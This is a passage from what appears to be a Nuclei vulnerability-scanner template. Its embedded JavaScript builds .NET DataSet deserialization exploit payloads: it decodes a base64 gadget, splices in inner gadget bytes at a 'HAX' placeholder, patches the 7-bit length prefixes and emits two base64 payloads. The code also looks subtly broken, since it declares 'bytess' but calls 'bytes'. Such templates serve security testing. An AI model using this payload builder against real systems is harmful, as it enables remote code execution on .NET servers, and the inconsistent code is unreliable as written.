    ig2: '{{internal_gadget2_b64}}'
  code: "const bytess = require(\"nuclei/bytes\");\n\nfunction u8(arr) { return new\
    \ Uint8Array(arr); }\n\n// String → Buffer (binary-safe)\nfunction strToBuf(str)\
    \ {\n  var b = new bytes.Buffer();\n  b.WriteString(str);\n  return b;\n}\n//\
    \ 7-bit int encoding (like .NET BinaryWriter)\nfunction encode7BitInt(n) {\n \
    \ if (n === 0) return new bytes.Buffer(u8([0]));\n  var tmp = [];\n  while (n\
    \ > 0) {\n    var v = n & 0x7F;\n    n >>>= 7;\n    if (n > 0) v |= 0x80;\n  \
    \  tmp.push(v);\n  }\n  return new bytes.Buffer(u8(tmp));\n}\n// Replace all occurrences\
    \ of needle(Buffer) with repl(Buffer) in hay(Buffer)\nfunction replaceAllBytes(hay,\
    \ needle, repl) {\n  var H = hay.Bytes();\n  var N = needle.Bytes();\n  var out\
    \ = new bytes.Buffer();\n\n  for (var i = 0; i < H.length;) {\n    var match =\
    \ true;\n    for (var j = 0; j < N.length; j++) {\n      if (i + j >= H.length\
    \ || H[i + j] !== N[j]) { match = false; break; }\n    }\n    if (match) {\n \
    \     out.Write(repl.Bytes());\n      i += N.length;\n    } else {\n      out.Write(u8([H[i]]));\
    \     // <-- IMPORTANT: Uint8Array, not plain []\n      i++;\n    }\n  }\n  return\
    \ out;\n}\ndataset_gadget_raw = strToBuf(atob(dg));\ndataset_gadget_raw1 = replaceAllBytes(\n\
    \  dataset_gadget_raw,\n  strToBuf(\"HAX\"),\n  strToBuf(ig)\n);\ndataset_gadget_raw2\
    \ = replaceAllBytes(\n  dataset_gadget_raw,\n  strToBuf(\"HAX\"),\n  strToBuf(ig2)\n\
    );\nvar oldLen = encode7BitInt(9163);\nvar newLen = encode7BitInt(9163 - 7772\
    \ + ig.length);\nvar newLen2 = encode7BitInt(9163 - 7772 + ig2.length);\ndataset_gadget_raw1\
    \ = replaceAllBytes(dataset_gadget_raw1, oldLen, newLen);\ndataset_gadget_raw2\
    \ = replaceAllBytes(dataset_gadget_raw2, oldLen, newLen2);\n(btoa(dataset_gadget_raw1.String())\
    \ + \":\" + btoa(dataset_gadget_raw2.String()))\n"
